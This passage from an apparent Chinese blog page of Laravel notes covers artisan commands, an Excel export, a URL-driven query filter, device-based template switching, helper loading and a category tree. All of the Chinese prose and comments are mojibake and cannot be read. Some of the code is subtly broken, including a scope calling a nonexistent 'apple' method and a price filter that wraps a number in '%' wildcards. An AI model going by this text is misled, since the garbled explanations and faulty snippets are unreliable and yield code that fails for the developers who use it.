åˆ›å»ºä¸€ä¸ªé˜Ÿåˆ—ä»»åŠ¡æ–‡ä»¶</span><br><span class="line">php artisan make:job </span><br><span class="line">// åˆ›å»ºä¸€ä¸ªç›‘å¬è€…ç±»</span><br><span class="line">php artisan make:listener name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„é‚®ä»¶ç±»</span><br><span class="line">php artisan make:mail name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„ä¸­é—´ä»¶ç±»</span><br><span class="line">php artisan make:middleware name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„è¿ç§»æ–‡ä»¶</span><br><span class="line">// --create     å°†è¢«åˆ›å»ºçš„æ•°æ®è¡¨.</span><br><span class="line">// --table      å°†è¢«è¿ç§»çš„æ•°æ®è¡¨.</span><br><span class="line">php artisan make:migration [--create[="..."]] [--table[="..."]] name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„ Eloquent æ¨¡å‹ç±»</span><br><span class="line">php artisan make:model User</span><br><span class="line">php artisan make:model Models/User</span><br><span class="line">// æ–°å»ºä¸€ä¸ªæ¶ˆæ¯é€šçŸ¥ç±»</span><br><span class="line">php artisan make:notification TopicRepliedNotification</span><br><span class="line">// æ–°å»ºä¸€ä¸ªæ¨¡å‹è§‚å¯Ÿè€…ç±»</span><br><span class="line">php artisan make:observer UserObserver</span><br><span class="line">// åˆ›å»ºæˆæƒç­–ç•¥</span><br><span class="line">php artisan make:policy PostPolicy</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„æœåŠ¡æä¾›è€…ç±»</span><br><span class="line">php artisan make:provider name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ªæ–°çš„è¡¨å•è¯·æ±‚ç±»</span><br><span class="line">php artisan make:request name</span><br><span class="line">// åˆ›å»ºä¸€ä¸ª API èµ„æºç±»</span><br><span class="line">php artisan make:resource name</span><br><span class="line">// æ–°å»ºéªŒè¯è§„åˆ™ç±»</span><br><span class="line">php artisan make:rule name</span><br><span class="line">// åˆ›å»ºæ¨¡å‹è„šæ‰‹æ¶</span><br><span class="line">// &lt;name&gt; æ¨¡å‹åç§°ï¼Œå¦‚ Post</span><br><span class="line">// -s, --schema=SCHEMA è¡¨ç»“æ„å¦‚ï¼š--schema="title:string"</span><br><span class="line">// -a, --validator[=VALIDATOR] è¡¨å•éªŒè¯ï¼Œå¦‚ï¼š--validator="title:required"</span><br><span class="line">// -l, --localization[=LOCALIZATION] è®¾ç½®æœ¬åœ°åŒ–ä¿¡æ¯ï¼Œå¦‚ï¼š--localization="key:value"</span><br><span class="line">// -b, --lang[=LANG] è®¾ç½®æœ¬åœ°åŒ–è¯­è¨€ --lang="en"</span><br><span class="line">// -f, --form[=FORM] ä½¿ç”¨ Illumintate/Html Form æ¥ç”Ÿæˆè¡¨å•é€‰é¡¹ï¼Œé»˜è®¤ä¸º false</span><br><span class="line">// -p, --prefix[=PREFIX] è¡¨ç»“æ„å‰ç¼€ï¼Œé»˜è®¤ false</span><br><span class="line">php artisan make:scaffold  [options] [--] &lt;name&gt;</span><br><span class="line">// ç”Ÿæˆæ•°æ®å¡«å……ç±»</span><br><span class="line">php artisan make:seeder</span><br><span class="line">// ç”Ÿæˆæµ‹è¯•ç±»</span><br><span class="line">php artisan make:test</span><br><span class="line"></span><br><span class="line">// æ•°æ®åº“è¿ç§»</span><br><span class="line">// --database   æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼ˆä¸‹åŒï¼‰</span><br><span class="line">// --force      å½“å¤„äºç”Ÿäº§ç¯å¢ƒæ—¶å¼ºåˆ¶æ‰§è¡Œï¼Œä¸è¯¢é—®ï¼ˆä¸‹åŒï¼‰</span><br><span class="line">// --path       æŒ‡å®šå•ç‹¬è¿ç§»æ–‡ä»¶åœ°å€</span><br><span class="line">// --pretend    æŠŠå°†è¦è¿è¡Œçš„ SQL è¯­å¥æ‰“å°å‡ºæ¥ï¼ˆä¸‹åŒï¼‰</span><br><span class="line">// --seed       Seed ä»»åŠ¡æ˜¯å¦éœ€è¦è¢«é‡æ–°è¿è¡Œï¼ˆä¸‹åŒï¼‰</span><br><span class="line">php artisan migrate [--database[="..."]] [--force] [--path[="..."]] [--pretend] [--seed]</span><br><span class="line">// åˆ›å»ºè¿ç§»æ•°æ®åº“è¡¨</span><br><span class="line">php artisan migrate:install [--database[="..."]]</span><br><span class="line">// Drop æ‰€æœ‰æ•°æ®è¡¨å¹¶é‡æ–°è¿è¡Œ Migration</span><br><span class="line">php artisan migrate:fresh</span><br><span class="line">// é‡ç½®å¹¶é‡æ–°è¿è¡Œæ‰€æœ‰çš„ migrations</span><br><span class="line">// --seeder     æŒ‡å®šä¸» Seeder çš„ç±»å</span><br><span class="line">php artisan migrate:refresh [--database[="..."]] [--force] [--seed] [--seeder[="..."]]</span><br><span class="line">// å›æ»šæ‰€æœ‰çš„æ•°æ®åº“è¿ç§»</span><br><span class="line">php artisan migrate:reset [--database[="..."]] [--force] [--pretend]</span><br><span class="line">// å›æ»šæœ€æœ€è¿‘ä¸€æ¬¡è¿è¡Œçš„è¿ç§»ä»»åŠ¡</span><br><span class="line">php artisan migrate:rollback [--database[="..."]] [--force] [--pretend]</span><br><span class="line">// migrations æ•°æ®åº“è¡¨ä¿¡æ¯</span><br><span class="line">php artisan migrate:status</span><br><span class="line"></span><br><span class="line">// ä¸ºæ•°æ®åº“æ¶ˆæ¯é€šçŸ¥åˆ›å»ºä¸€ä¸ªè¡¨è¿ç§»ç±»</span><br><span class="line">php artisan notifications:table</span><br><span class="line">// æ¸…é™¤ç¼“å­˜çš„ bootstrap æ–‡ä»¶</span><br><span class="line">php artisan optimize:clear</span><br><span class="line">// æ‰©å±•åŒ…è‡ªåŠ¨å‘ç°</span><br><span class="line">php artisan package:discover</span><br><span class="line"></span><br><span class="line">// ä¸ºé˜Ÿåˆ—æ•°æ®åº“è¡¨åˆ›å»ºä¸€ä¸ªæ–°çš„è¿ç§»</span><br><span class="line">php artisan queue:table</span><br><span class="line">// ç›‘å¬æŒ‡å®šçš„é˜Ÿåˆ—</span><br><span class="line">// --queue      è¢«ç›‘å¬çš„é˜Ÿåˆ—</span><br><span class="line">// --delay      ç»™æ‰§è¡Œå¤±è´¥çš„ä»»åŠ¡è®¾ç½®å»¶æ—¶æ—¶é—´ (é»˜è®¤ä¸ºé›¶: 0)</span><br><span class="line">// --memory     å†…å­˜é™åˆ¶å¤§å°ï¼Œå•ä½ä¸º MB (é»˜è®¤ä¸º: 128)</span><br><span class="line">// --timeout    æŒ‡å®šä»»åŠ¡è¿è¡Œè¶…æ—¶ç§’æ•° (é»˜è®¤ä¸º: 60)</span><br><span class="line">// --sleep      ç­‰å¾…æ£€æŸ¥é˜Ÿåˆ—ä»»åŠ¡çš„ç§’æ•° (é»˜è®¤ä¸º: 3)</span><br><span class="line">// --tries      ä»»åŠ¡è®°å½•å¤±è´¥é‡è¯•æ¬¡æ•° (é»˜è®¤ä¸º: 0)</span><br><span class="line">php artisan queue:listen [--queue[="..."]] [--delay[="..."]] [--memory[="..."]] [--timeout[="..."]] [--sleep[="..."]] [--tries[="..."]] [connection]</span><br><span class="line">// æŸ¥çœ‹æ‰€æœ‰æ‰§è¡Œå¤±è´¥çš„é˜Ÿåˆ—ä»»åŠ¡</span><br><span class="line">php artisan queue:failed</span><br><span class="line">// ä¸ºæ‰§è¡Œå¤±è´¥çš„æ•°æ®è¡¨ä»»åŠ¡åˆ›å»ºä¸€ä¸ªè¿ç§»</span><br><span class="line">php artisan queue:failed-table</span><br><span class="line">// æ¸…é™¤æ‰€æœ‰æ‰§è¡Œå¤±è´¥çš„é˜Ÿåˆ—ä»»åŠ¡</span><br><span class="line">php artisan queue:flush</span><br><span class="line">// åˆ é™¤ä¸€ä¸ªæ‰§è¡Œå¤±è´¥çš„é˜Ÿåˆ—ä»»åŠ¡</span><br><span class="line">php artisan queue:forget</span><br><span class="line">// åœ¨å½“å‰çš„é˜Ÿåˆ—ä»»åŠ¡æ‰§è¡Œå®Œæ¯•å, é‡å¯é˜Ÿåˆ—çš„å®ˆæŠ¤è¿›ç¨‹</span><br><span class="line">php artisan queue:restart</span><br><span class="line">// å¯¹æŒ‡å®š id çš„æ‰§è¡Œå¤±è´¥çš„é˜Ÿåˆ—ä»»åŠ¡è¿›è¡Œé‡è¯•(id: å¤±è´¥é˜Ÿåˆ—ä»»åŠ¡çš„ ID)</span><br><span class="line">php artisan queue:retry id</span><br><span class="line">// æŒ‡å®šè®¢é˜… Iron.io é˜Ÿåˆ—çš„é“¾æ¥</span><br><span class="line">// queue: Iron.io çš„é˜Ÿåˆ—åç§°.</span><br><span class="line">// url: å°†è¢«è®¢é˜…çš„ URL.</span><br><span class="line">// --type       æŒ‡å®šé˜Ÿåˆ—çš„æ¨é€ç±»å‹.</span><br><span class="line">php artisan queue:subscribe [--type[="..."]] queue url</span><br><span class="line">// å¤„ç†ä¸‹ä¸€ä¸ªé˜Ÿåˆ—ä»»åŠ¡</span><br><span class="line">// --queue      è¢«ç›‘å¬çš„é˜Ÿåˆ—</span><br><span class="line">// --daemon     åœ¨åå°æ¨¡å¼è¿è¡Œ</span><br><span class="line">// --delay      ç»™æ‰§è¡Œå¤±è´¥çš„ä»»åŠ¡è®¾ç½®å»¶æ—¶æ—¶é—´ (é»˜è®¤ä¸ºé›¶: 0)</span><br><span class="line">// --force      å¼ºåˆ¶åœ¨ã€Œç»´æŠ¤æ¨¡å¼ä¸‹ã€è¿è¡Œ</span><br><span class="line">// --memory     å†…å­˜é™åˆ¶å¤§å°ï¼Œå•ä½ä¸º MB (é»˜è®¤ä¸º: 128)</span><br><span class="line">// --sleep      å½“æ²¡æœ‰ä»»åŠ¡å¤„äºæœ‰æ•ˆçŠ¶æ€æ—¶, è®¾ç½®å…¶è¿›å…¥ä¼‘çœ çš„ç§’æ•° (é»˜è®¤ä¸º: 3)</span><br><span class="line">// --tries      ä»»åŠ¡è®°å½•å¤±è´¥é‡è¯•æ¬¡æ•° (é»˜è®¤ä¸º: 0)</span><br><span class="line">php artisan queue:work [--queue[="..."]] [--daemon] [--delay[="..."]] [--force] [--memory[="..."]] [--sleep[="..."]] [--tries[="..."]] [connection]</span><br><span class="line"></span><br><span class="line">// ç”Ÿæˆè·¯ç”±ç¼“å­˜æ–‡ä»¶æ¥æå‡è·¯ç”±æ•ˆç‡</span><br><span class="line">php artisan route:cache</span><br><span class="line">// ç§»é™¤è·¯ç”±ç¼“å­˜æ–‡ä»¶</span><br><span class="line">php artisan route:clear</span><br><span class="line">// æ˜¾ç¤ºå·²æ³¨å†Œè¿‡çš„è·¯ç”±</span><br><span class="line">php artisan route:list</span><br><span class="line"></span><br><span class="line">// è¿è¡Œè®¡åˆ’å‘½ä»¤</span><br><span class="line">php artisan schedule:run</span><br><span class="line"></span><br><span class="line">// ä¸º session æ•°æ®è¡¨ç”Ÿæˆè¿ç§»æ–‡ä»¶</span><br><span class="line">php artisan session:table</span><br><span class="line">// åˆ›å»º "public/storage" åˆ° "storage/app/public" çš„è½¯é“¾æ¥</span><br><span class="line">php artisan storage:link</span><br><span class="line"></span><br><span class="line">// ä» vendor çš„æ‰©å±•åŒ…ä¸­å‘å¸ƒä»»ä½•å¯å‘å¸ƒçš„èµ„æº</span><br><span class="line">// --force        é‡å†™æ‰€æœ‰å·²å­˜åœ¨çš„æ–‡ä»¶</span><br><span class="line">// --provider     æŒ‡å®šä½ æƒ³è¦å‘å¸ƒèµ„æºæ–‡ä»¶çš„æœåŠ¡æä¾›è€…</span><br><span class="line">// --tag          æŒ‡å®šä½ æƒ³è¦å‘å¸ƒæ ‡è®°èµ„æº.</span><br><span class="line">php artisan vendor:publish [--force] [--provider[="..."]] [--tag[="..."]]</span><br><span class="line">php artisan tail [--path[="..."]] [--lines[="..."]] [connection]</span><br><span class="line"></span><br><span class="line">// ç¼“å­˜è§†å›¾æ–‡ä»¶ä»¥æé«˜æ•ˆç‡</span><br><span class="line">php artisan view:cache</span><br><span class="line">// æ¸…é™¤è§†å›¾æ–‡ä»¶ç¼“å­˜</span><br><span class="line">php artisan view:clear</span><br><span class="line"></span><br><span class="line">https://laravelcode.cn/docs/5.8</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel"><a href="#Laravel-Excel" class="headerlink" title="Laravel Excel"></a>Laravel Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> maatwebsite/excel</span><br><span class="line">php artisan vendor:publish --provider=<span class="string">"Maatwebsite\Excel\ExcelServiceProvider"</span></span><br><span class="line"></span><br><span class="line">php artisan make:<span class="keyword">export</span> UsersExport --model=User</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use App\User;</span><br><span class="line">use Maatwebsite\Excel\Concerns\FromCollection;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersExport</span> <span class="title">implements</span> <span class="title">FromCollection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">collection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> User::all();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">æ§åˆ¶å™¨ä¸­è°ƒç”¨</span><br><span class="line"></span><br><span class="line">use App\Exports\UsersExport;</span><br><span class="line">use Maatwebsite\Excel\Facades\Excel;</span><br><span class="line">use App\Http\Controllers\Controller;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Excel::download(<span class="keyword">new</span> UsersExport, <span class="string">'users.xlsx'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29089</span></span><br></pre></td></tr></table></figure>
<h3 id="æ¨¡å‹è¿‡æ»¤"><a href="#æ¨¡å‹è¿‡æ»¤" class="headerlink" title="æ¨¡å‹è¿‡æ»¤"></a>æ¨¡å‹è¿‡æ»¤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Book::query()</span><br><span class="line">        -&gt;where(<span class="string">'title'</span>, <span class="string">'like'</span>, <span class="string">'%æˆ‘ä»¬%'</span>)</span><br><span class="line">        -&gt;where(<span class="string">'price'</span>, <span class="string">'&gt;='</span>, <span class="number">30</span>)</span><br><span class="line">        -&gt;where(<span class="string">'publisher'</span>, <span class="string">'å¤§åœ°å‡ºç‰ˆç¤¾'</span>)</span><br><span class="line">        -&gt;orderBy(<span class="string">'id'</span>, <span class="string">'DESC'</span>)</span><br><span class="line">        -&gt;get();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">QueryFilter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $request;</span><br><span class="line">    protected $builder;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Request $request</span>)                                                                        </span></span><br><span class="line"><span class="function">    </span>&#123;                                                                                                                    </span><br><span class="line">        $<span class="keyword">this</span>-&gt;request = $request;                                                                                       </span><br><span class="line">    &#125;                                                                                                                    </span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">apply</span>(<span class="params">Builder $builder</span>)                                                                              </span></span><br><span class="line"><span class="function">    </span>&#123;                                                                                                                    </span><br><span class="line">        $<span class="keyword">this</span>-&gt;builder = $builder;                                                                                       </span><br><span class="line"></span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;filters() <span class="keyword">as</span> $name =&gt; $value) &#123;                                                                  </span><br><span class="line">            <span class="keyword">if</span> (method_exists($<span class="keyword">this</span>, $name)) &#123;                                                                           </span><br><span class="line">                call_user_func_array([$<span class="keyword">this</span>, $name], array_filter([$value]));                                            </span><br><span class="line">        &#125;                                                                                                            </span><br><span class="line">     &#125;                                                                                                                </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder;                                                                                           </span><br><span class="line">    &#125;                                                                                                                    </span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">filters</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;request-&gt;all();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookFilter</span> <span class="keyword">extends</span> <span class="title">QueryFilter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">title</span>(<span class="params">$title</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'title'</span>, <span class="string">'like'</span>, <span class="string">"%&#123;$title&#125;%"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params">$price</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'price'</span>, <span class="string">'&gt;='</span>, <span class="string">"%&#123;$price&#125;%"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">publisher</span>(<span class="params">$publisher</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'publisher'</span>, $publisher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">é€šè¿‡ URL çš„å‚æ•°æ¥è¿›è¡ŒåŠ¨æ€æŸ¥è¯¢ã€‚</span><br><span class="line"></span><br><span class="line">books?title=æˆ‘ä»¬    <span class="comment">//  æŸ¥æ‰¾æ ‡é¢˜å«æœ‰æˆ‘ä»¬çš„å›¾ä¹¦</span></span><br><span class="line"></span><br><span class="line">books?title=æˆ‘ä»¬&amp;price=<span class="number">25</span>   <span class="comment">//  æŸ¥æ‰¾æ ‡é¢˜å«æœ‰æˆ‘ä»¬å¹¶ä¸”ä»·æ ¼å¤§äº25å…ƒçš„å›¾ä¹¦</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">scopeFilter</span>(<span class="params">$query, QueryFilter $filters</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $filters-&gt;apple($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æœ€åï¼Œæˆ‘ä»¬åŸæ¥æ§åˆ¶å™¨çš„æ–¹æ³•å°†æ”¹ä¸ºä¸‹é¢çš„æ ·å­ï¼š</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">BookFilter $filters</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Book::filter($filters)-&gt;get();</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29100#reply91762</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-é…ç½®åŒæ¨¡æ¿"><a href="#Laravel-é…ç½®åŒæ¨¡æ¿" class="headerlink" title="Laravel é…ç½®åŒæ¨¡æ¿"></a>Laravel é…ç½®åŒæ¨¡æ¿</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> whichbrowser/parser</span><br><span class="line">php artisan make:middleware Template</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $except = [];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request, Closure $next</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = <span class="keyword">new</span> WhichBrowser\Parser(getallheaders());</span><br><span class="line">        <span class="comment">// å¦‚æœæ˜¯æ¡Œé¢ç±»å‹, è¿”å›true</span></span><br><span class="line">        $isDesktop = $result-&gt;isType(<span class="string">'desktop'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($isDesktop) &#123;</span><br><span class="line">            <span class="comment">// åŠ è½½pcç«¯çš„æ¨¡æ¿æ–‡ä»¶</span></span><br><span class="line">            $path = resource_path(<span class="string">'views/pc/'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// åŠ è½½mobileç«¯çš„æ¨¡æ¿æ–‡ä»¶</span></span><br><span class="line">            $path = resource_path(<span class="string">'views/mobile/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è·å–è§†å›¾æŸ¥æ‰¾å™¨å®ä¾‹</span></span><br><span class="line">        $view = app(<span class="string">'view'</span>)-&gt;getFinder();</span><br><span class="line">        <span class="comment">// é‡æ–°å®šä¹‰è§†å›¾ç›®å½•</span></span><br><span class="line">        $view-&gt;prependLocation($path);</span><br><span class="line">        <span class="comment">// è¿”å›è¯·æ±‚</span></span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">protected $middleware = [</span><br><span class="line">    \App\Http\Middleware\Template::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">return</span> view(<span class="string">'registration.index'</span>, $data);</span><br><span class="line">å¦‚ä» PC è®¾å¤‡æ‰“å¼€ç½‘é¡µï¼šåŠ è½½ /resources/views/pc/registration/index.blade.php æ¨¡æ¿</span><br><span class="line"></span><br><span class="line">å¦‚ä»ç§»åŠ¨è®¾å¤‡æ‰“å¼€ç½‘é¡µï¼šåŠ è½½ /resources/views/mobile/registration/index.blade.php æ¨¡æ¿</span><br><span class="line">https:<span class="comment">//learnku.com/articles/24789</span></span><br></pre></td></tr></table></figure>
<h3 id="åŠ©æ‰‹å‡½æ•°"><a href="#åŠ©æ‰‹å‡½æ•°" class="headerlink" title="åŠ©æ‰‹å‡½æ•°"></a>åŠ©æ‰‹å‡½æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:provider HelperServiceProvider</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foreach(glob(app_path(<span class="string">'Helpers'</span>) . <span class="string">'/*.php'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        require_once $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">App\Providers\HelperServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">carbon</span>($<span class="title">time</span> </span>= <span class="literal">null</span>, $tz = <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> \Carbon\Carbon($time, $tz);</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//blog.foof.dev/posts/laravel-elegant-add-helper-function-0</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ›å»ºæ— é™æåˆ†ç±»æ ‘"><a href="#åˆ›å»ºæ— é™æåˆ†ç±»æ ‘" class="headerlink" title="åˆ›å»ºæ— é™æåˆ†ç±»æ ‘"></a>åˆ›å»ºæ— é™æåˆ†ç±»æ ‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params">$catList</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $treeData = [];</span><br><span class="line">    foreach ($catList <span class="keyword">as</span> &amp;$item) &#123;</span><br><span class="line">        $parent_id = $item[<span class="string">'parent_id'</span>];</span><br><span class="line">        <span class="keyword">if</span> (isset($catList[$parent_id]) &amp;&amp; !empty($catList[$parent_id])) &#123;</span><br><span class="line">            $catList[$parent_id][<span class="string">'list'</span>][] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $treeData[] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unset($item);</span><br><span class="line">    <span class="keyword">return</span> $treeData[<span class="number">0</span>][<span class="string">'list'</span>]; <span class="comment">// æ ¹èŠ‚ç‚¹åªæœ‰ä¸­åäººæ°‘å…±å’Œå›½ï¼Œæ‰€ä»¥ç›´æ¥è¿”å›ä¸­å›½çš„æ‰€æœ‰å­èŠ‚ç‚¹</span></span><br><span 